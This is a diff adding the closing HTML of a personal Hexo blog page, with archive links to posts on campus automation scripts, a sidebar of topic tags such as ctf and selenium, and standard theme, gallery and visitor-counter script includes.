+            <a class="archive-post-title" href="/2024/11/27/oucBookSeminar/">研讨室预约填写信息自动化工具</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/27</span>
+            <a class="archive-post-title" href="/2024/10/27/oucAutoCheckIn/">ouc接龙管家自动晚打卡</a>
+        </li>
+            </ul>
+    </div>
+</div>
+
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+            <span class="sidebar-tag-name" data-tags="ctf">
+                <span class="iconfont-archer">&#xe606;</span>
+                ctf
+            </span>
+            <span class="sidebar-tag-name" data-tags="writeup">
+                <span class="iconfont-archer">&#xe606;</span>
+                writeup
+            </span>
+            <span class="sidebar-tag-name" data-tags="web">
+                <span class="iconfont-archer">&#xe606;</span>
+                web
+            </span>
+            <span class="sidebar-tag-name" data-tags="python">
+                <span class="iconfont-archer">&#xe606;</span>
+                python
+            </span>
+            <span class="sidebar-tag-name" data-tags="requests">
+                <span class="iconfont-archer">&#xe606;</span>
+                requests
+            </span>
+            <span class="sidebar-tag-name" data-tags="青龙面板">
+                <span class="iconfont-archer">&#xe606;</span>
+                青龙面板
+            </span>
+            <span class="sidebar-tag-name" data-tags="debian">
+                <span class="iconfont-archer">&#xe606;</span>
+                debian
+            </span>
+            <span class="sidebar-tag-name" data-tags="selenium">
+                <span class="iconfont-archer">&#xe606;</span>
+                selenium
+            </span>
+            <span class="sidebar-tag-name" data-tags="javascript">
+                <span class="iconfont-archer">&#xe606;</span>
+                javascript
+            </span>
+            <span class="sidebar-tag-name" data-tags="js">
+                <span class="iconfont-archer">&#xe606;</span>
+                js
+            </span>
+            <span class="sidebar-tag-name" data-tags="vbs">
+                <span class="iconfont-archer">&#xe606;</span>
+                vbs
+            </span>
+            <span class="sidebar-tag-name" data-tags="-web">
+                <span class="iconfont-archer">&#xe606;</span>
+                -web
+            </span>
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+
+    </div>
+</div>
+
+        <!-- site-meta -->
+        <script>
+    var siteMetaRoot = "/"
+    if (siteMetaRoot === "undefined") {
+        siteMetaRoot = '/'
+    }
+    var siteMeta = {
+        url: "http://huajihd.github.io",
+        root: siteMetaRoot,
+        author: "Huaji"
+    }
+</script>
+
+        <!-- import experimental options here -->
+        <!-- Custom Font -->
+
+        <!-- main func -->
+        <script src="/scripts/main.js"></script>
+        <!-- fancybox -->
+        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.36/dist/fancybox/fancybox.umd.js" onload="window.Fancybox.bind('[data-fancybox]')" defer></script>
+        <!-- algolia -->
+        <!-- busuanzi -->
+            <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+        <!-- async load share.js -->
+            <script src="/scripts/share.js" async></script>
+        <!-- mermaid -->
+    </body>
+</html>
